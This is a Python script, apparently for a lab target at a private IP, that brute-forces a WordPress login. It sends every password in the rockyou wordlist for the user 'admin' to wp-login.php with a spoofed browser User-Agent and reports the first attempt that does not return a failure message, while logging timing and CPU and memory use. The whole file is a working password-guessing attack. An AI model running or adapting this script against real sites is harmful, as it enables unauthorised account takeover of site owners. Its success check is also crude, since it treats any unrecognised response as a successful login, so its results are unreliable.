import requests
import time
import psutil

# Target URL for WordPress login
url = "http://10.0.2.5/wordpress/wp-login.php"

# Wordlist for passwords (You can replace this with the full path of your wordlist)
wordlist = "/usr/share/wordlists/rockyou.txt"  # Example: /usr/share/wordlists/rockyou.txt

# Username for brute forcing (replace with the target username)
username = "admin"

# Headers to simulate a browser request
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome"
}

# Open the wordlist file
with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
    passwords = f.readlines()

# Iterate through each password in the wordlist
for password in passwords:
    password = password.strip()  # Remove newline or extra spaces

    # Measure start time
    start_time = time.time()

    # Prepare the login data
    login_data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "testcookie": "1",
    }

    # Make the POST request to the login page
    try:
        response = requests.post(url, data=login_data, headers=headers, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to {url}: {e}")
        continue

    # Measure end time and calculate duration
    end_time = time.time()
    duration = end_time - start_time

    # Get current CPU and memory usage
    cpu_usage = psutil.cpu_percent(interval=0.1)
    memory_usage = psutil.virtual_memory().percent

    # Output the result
    if "incorrect username" in response.text or "The password you entered for the username" in response.text:
        print(f"Failed login attempt with password: {password}")
    else:
        print(f"Login successful with username and password: {username}, {password}")
        # Print the time taken and resource usage
        print(f"Time taken for this attempt: {duration:.2f} seconds")
        print(f"CPU usage during attempt: {cpu_usage}%")
        print(f"Memory usage during attempt: {memory_usage}%")

        # Break after first successful login
        if "incorrect" not in response.text.lower():
            break
